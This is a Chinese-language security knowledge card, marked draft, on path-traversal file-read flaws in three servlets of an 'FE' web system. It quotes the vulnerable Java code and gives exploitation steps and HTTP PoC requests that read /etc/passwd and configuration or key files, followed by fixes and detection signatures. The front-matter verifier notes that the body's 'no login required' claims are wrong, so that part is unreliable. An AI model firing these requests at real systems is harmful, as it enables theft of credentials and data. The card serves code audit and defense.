---
id: web-generic-file-inclusion-fe-system-servlet-param-arbitrary-read
title: FE 系统三处 Servlet 参数直入 File/FileInputStream：imagePath、base64 filename 与 pdf 前缀穿越读取
type: scenario
domain: web
path: web/generic/file-inclusion
technique: fe-servlet-param-arbitrary-file-read
aliases:
- FE 系统任意文件读取
- ShowImageServlet 文件读取
- UploadAttachmentServlet type=mail 读取
- GetPdfFile 文件读取
- FeBase64 filename 穿越
- SIGNATURE_PDF_PATH 前缀绕过
tags:
- java
- servlet
- arbitrary-file-read
- path-traversal
- fileinputstream
- fileutils
- base64
- code-audit
cve: []
severity: high
confidence: high
status: draft
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V54
  verified_at: '2026-11-05T08:54:39+08:00'
  notes: 三处源码与图16-23一致：ShowImageServlet imagePath 直入 new File+FileUtils.readFileToByteArray；MailAttachmentUtil.doUpload 的 filename 经 FeBase64.decode 后拼路径并 new FileInputStream；GetPdfFile 以 SIGNATURE_PDF_PATH startsWith 判断后 ../ 穿越读取。问题：卡内触发条件称 UploadAttachmentServlet 的 mail 读取分支“无需登录（该方法未校验用户）”，但同项目 ControllerFilter5 的 @WebFilter urlPatterns 含 /servlet/*（图09），excludeSet 仅放行 /servlet/pageProcessServlet、/servlet/mobileServlet、/servlet/kaptcha 等（图11），uploadAttachmentServlet 与 ShowImageServlet 均未放行，过滤器层仍要求有效会话；ShowImageServlet 的 print 仅绕过 servlet 内 user==null 判断，不能绕过过滤器。需修正鉴权表述后方可通过。PoC 未在本机执行。
---

## 一句话结论

FE 系统的三个 Servlet 入口都把请求参数直接变成文件路径：`ShowImageServlet` 的 `imagePath` 经 `new File` + `FileUtils.readFileToByteArray` 回显；`UploadAttachmentServlet?type=mail` 的 `filename` 经 Base64 解码后拼进邮件附件路径再 `new FileInputStream`；`GetPdfFile` 的 `filename` 在 `SIGNATURE_PDF_PATH` 前缀检查后用 `../` 穿越读取；三处都缺少路径规范化和根目录约束。

## 原理

- **入口一：`ShowImageServlet.doGet`**
  ```java
  String sImgGuid = request.getParameter("IMGGUID");
  String sImagePath = request.getParameter("imagePath");
  User user = UserSession.get(request);
  String print = request.getParameter("print");
  if (user == null && print == null) { throw new SysException("未登录访问!"); }
  if (sImgGuid != null && !"".equals(sImgGuid.trim())) {
      sImagePath = SysSetup.getParameter("absPath");
      imageFile = new File(sImagePath + "/" + sImgGuid);
      ...
  } else {
      imageFile = new File(sImagePath);     // 用户完全可控
  }
  if (imageFile.exists()) { this.writeImageToResponse(response, imageFile); }
  ```
  `writeImageToResponse` 调用 `FileUtils.readFileToByteArray((File)imageFile)` 后 `toClient.write(data)`，把文件内容原样写入响应。`imagePath` 无前缀、无白名单，可传绝对路径或 `../`；`print` 参数非空即可让未登录请求通过（`user == null && print == null` 才抛异常）。路由为 `/servlet/ShowImageServlet`。
- **入口二：`UploadAttachmentServlet.doGet` + `MailAttachmentUtil.doUpload`**
  - `doGet`：`if ("mail".equals(type)) { new MailAttachmentUtil().doUpload(request, response); } else { this.doUpload(...); }`。
  - `doUpload` 用 `request.getContentLength()` 分流：GET 的 contentLength 为 -1，进入 else 的读取分支：
    ```java
    String fPath = request.getParameter("filePath");
    String username = request.getParameter("username");
    String boxname = request.getParameter("boxname");
    String mailid = request.getParameter("mailid");
    String filename = request.getParameter("filename");
    filename = FeBase64.decode(filename, "Unicode");   // 仅解码，无过滤
    String filePath = fPath + "/_" + username + "/" + boxname + "/" + mailid + "/" + filename;
    File file = new File(filePath);
    this.downloadByFile(file, response);               // new FileInputStream(file) → 写出响应
    ```
    `filename` 解码后可含 `../`、绝对路径；`username`/`boxname`/`mailid` 也直接拼进路径，均未归一化。路由为 `/servlet/uploadAttachmentServlet`。
- **入口三：`GetPdfFile.doPost`**
  ```java
  User user = UserSession.get(request);
  if (user == null) { return; }
  String filename = request.getParameter("filename");
  String pdfFile = SysSetup.getMediaParameter("SIGNATURE_PDF_PATH"); // /data/FEV7.0SP2/Media/office/pdf
  String realPath = filename;
  if (!filename.startsWith(pdfFile)) {
      realPath = pdfFile + File.separator + filename;
  }
  File file = new File(realPath);
  ... new FileInputStream(file) → 写出响应
  ```
  前缀检查只做 `startsWith`：传 `/data/FEV7.0SP2/Media/office/pdf/../../../../etc/passwd` 既满足前缀，又通过 `..` 跳到系统文件；传 `../../../../etc/passwd` 则被拼到 pdf 目录后同样穿越。需要已登录会话（`user == null` 直接返回）。
- **共同根因**：Java `File`/`FileInputStream`/`FileUtils` 不限制 `..`、绝对路径；代码没有 `getCanonicalPath()`/`normalize()` 后的根目录校验，也没有文件类型白名单。读取结果直接写响应，形成有回显的任意文件读取。

## 触发条件

- 目标为使用该 FE 系统代码库的应用，上述 Servlet 路由可达。
- `ShowImageServlet`：可带 `print` 参数绕过 `user == null && print == null` 的异常分支（或已登录）；`imagePath` 可控。
- `UploadAttachmentServlet`：可发 GET，`type=mail`，`filename` 为 Base64 编码的穿越/绝对路径；无需登录（该方法未校验用户）。
- `GetPdfFile`：需要有效用户会话（任意账号或经任意登录漏洞获取）。
- 应用进程对目标文件有读权限；目标未对参数做路径白名单/WAF 拦截。

## 利用步骤

1. `ShowImageServlet`：GET `/servlet/ShowImageServlet?print=1&IMGGUID=&imagePath=/etc/passwd`（Windows 用 `C:\Windows\win.ini`），观察响应是否为文件内容。
2. `UploadAttachmentServlet`：把 `../../../../etc/passwd` 做 Base64（Unicode 编码）后放入 `filename`，GET `/servlet/uploadAttachmentServlet?type=mail&filePath=/tmp&username=..&boxname=..&mailid=..&filename=<b64>`，调整 `../` 数量。
3. `GetPdfFile`：登录后 POST `filename=/data/FEV7.0SP2/Media/office/pdf/../../../../etc/passwd`，观察 PDF/文本回显。
4. 读取 `WEB-INF/web.xml`、`WEB-INF/classes` 配置、数据库连接串、密钥文件；按目标部署调整 `SIGNATURE_PDF_PATH` 的实际值（可能在 `system-bean.xml` 中配置）。
5. 保存响应作为证据；不要修改或删除目标文件。

## PoC

`ShowImageServlet`：

```http
GET /servlet/ShowImageServlet?print=1&IMGGUID=&imagePath=/etc/passwd HTTP/1.1
Host: target
```

`UploadAttachmentServlet`（`filename` 为 `../../../../etc/passwd` 的 Base64，需按目标编码调整）：

```http
GET /servlet/uploadAttachmentServlet?type=mail&filePath=/tmp&username=x&boxname=x&mailid=x&filename=Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA== HTTP/1.1
Host: target
```

`GetPdfFile`：

```http
POST /servlet/GetPdfFile HTTP/1.1
Host: target
Cookie: JSESSIONID=<valid-session>
Content-Type: application/x-www-form-urlencoded

filename=/data/FEV7.0SP2/Media/office/pdf/../../../../etc/passwd
```

说明：`GetPdfFile` 的前缀值来自 `SIGNATURE_PDF_PATH` 配置，实际路径按部署调整；`UploadAttachmentServlet` 的 `FeBase64` 解码细节需以目标实现为准。PoC 依据源码构造，未在本会话执行。

## 变体与关联

- **Windows 路径**：`C:\Windows\win.ini`、`..\..\`、`C:/` 混用；`GetPdfFile` 的前缀检查对 `C:` 同样可用 `../` 跳出。
- **参数组合**：`ShowImageServlet` 的 `IMGGUID` 非空时走 `SysSetup.getParameter("absPath") + "/" + IMGGUID`，若 `absPath` 可控或可写，也可作为读取/路径拼接点。
- **Base64 编码**：`filename` 是 Base64 解码而非 URL 解码；`FeBase64.decode(..., "Unicode")` 可能按 Unicode/UTF-16 处理，构造时需匹配目标编码。
- **鉴权**：`GetPdfFile` 需要会话；`ShowImageServlet` 可用 `print` 参数绕过未登录判断；`UploadAttachmentServlet` 的 mail 读取分支不校验用户。任意登录漏洞（见关联卡）可直接提供会话。
- 关联：[[web-generic-auth-fe-login-opd-admin-session]]（同系统的任意管理员登录，可为 GetPdfFile 提供会话）；[[web-generic-file-inclusion-oa-getfile-mappingaddress]]（参数直入 FileInputStream 的同类形态）；[[web-java-framework-ruoyi-download-resource-path-traversal]]（下载接口路径穿越）。

## 检测与防御

- **代码修复**：三个入口都改为服务端生成的文件 ID/相对路径，禁止用户传绝对路径；`Paths.get(base, name).normalize()` 后校验 `startsWith(baseCanonical)`；拒绝 `..`、反斜杠、绝对路径与编码变体；读取前做扩展名/类型白名单。
- **鉴权**：`UploadAttachmentServlet` 的 mail 读取分支增加用户校验；`ShowImageServlet` 不要把 `print` 参数作为免登录开关；`GetPdfFile` 在路径校验之外再做权限校验。
- **检测特征**：请求参数含 `../`、`..\`、`/etc/`、`C:\`、`WEB-INF`；`filename` 为长 Base64 且解码后含路径分隔符；响应中出现系统文件/配置内容；`ShowImageServlet` 带 `print=1` 且 `imagePath` 异常；`GetPdfFile` 的 `filename` 以 `SIGNATURE_PDF_PATH` 开头但包含 `..`。
- **应急**：审计访问日志确认读取过哪些文件；轮换配置中泄露的数据库口令、密钥；修复后回归正常图片/附件/PDF 下载。
